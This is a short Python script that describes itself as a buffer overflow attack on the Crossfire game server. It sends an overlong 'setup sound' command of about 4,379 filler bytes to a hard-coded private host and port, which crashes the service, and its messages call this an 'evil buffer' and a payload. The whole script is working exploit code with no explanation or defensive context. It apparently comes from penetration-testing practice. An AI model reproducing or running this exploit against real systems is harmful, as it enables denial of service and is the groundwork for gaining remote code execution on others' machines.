#!/usr/bin/python
import socket
import time

print "[*] Buffer Overflow Attack - for crossfire game"
time.sleep(1)
print "[*] Setup the server address and port number"
time.sleep(1)
host = "192.168.128.44"
port = 13327

print "[*] Creating the buffer payload"
time.sleep(1)
crash = "\x41" * 4379
mybuffer = "\x11(setup sound " + crash + "\x90\x00#"

session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending evil buffer..."

session.connect((host,port))
print session.recv(1024)

session.send(mybuffer)
session.close()

print "[*] Pyload sent!"
